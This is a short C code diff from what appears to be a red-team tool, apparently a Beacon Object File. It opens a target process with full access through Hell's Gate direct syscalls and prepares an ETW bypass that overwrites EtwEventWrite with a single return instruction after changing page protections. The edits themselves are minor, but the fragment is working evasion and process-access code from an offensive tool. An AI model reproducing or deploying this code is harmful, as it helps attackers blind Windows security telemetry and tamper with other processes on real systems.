@@ -208,15 +208,16 @@ void go(char * args, int len) {
 	CLIENT_ID cid;
 	// unsigned __int64 pid = 5736;
 	//cid.pid = (HANDLE)8968;
-	cid.pid = (HANDLE)pid;
+	cid.pid = NULL;
 	cid.UniqueThread = NULL;
+	cid.pid = (HANDLE)pid;
 	__debugbreak();
 	// nt.NtOpenProcess(&hProc, 0x1FFFFF, &oa, &cid);
 	HellsGate(nt.NtOpenProcessSyscall);
     HellDescent(&hProc, 0x1FFFFF, &oa, &cid);
 	// ETW Bypass
     CHAR etwbypass[] = { 0xC3 }; // ret
-	unsigned __int64 etwbypassSize = 1;
+	//unsigned __int64 etwbypassSize = 1;
 	PVOID aligedETW = pageAlign(nt.pEtwEventWrite);
 	unsigned __int64 memPage = 0x1000; 
 	// The variable for our memory protections as we toggle RX<->RW 
